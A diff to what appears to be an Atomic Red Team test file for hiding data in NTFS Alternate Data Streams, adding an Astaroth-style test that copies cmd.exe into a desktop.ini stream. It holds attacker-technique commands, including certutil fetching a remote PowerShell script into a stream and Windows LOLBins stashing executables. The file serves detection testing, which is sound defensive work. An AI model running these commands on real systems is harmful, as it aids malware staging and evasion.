@@ -22,14 +22,48 @@ atomic_tests:
 
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
       extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
       findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
-      certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
+      certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 c:\temp:ttt
       makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
       print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
       reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
       regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
       expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
       esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o
+
+- name: Store file in Alternate Data Stream (ADS)
+  description: |
+    Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.
+    Upon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    payload_path:
+      description: Path of file to hide in ADS
+      type: path
+      default: c:\windows\system32\cmd.exe
+    ads_file_path:
+      description: Path of file to create an ADS under
+      type: path
+      default: C:\Users\Public\Libraries\yanki\desktop.ini
+    ads_name:
+      description: Name of ADS
+      type: string
+      default: desktop.ini
+
+  executor:
+    name: powershell
+    elevation_required: false
+    prereq_command: |
+    command: |
+      if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
+          New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
+          }
+      Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"#{ads_file_path}:#{ads_name}`""
+    cleanup_command: |
+      Remove-Item "#{ads_file_path}" -Force -ErrorAction Ignore
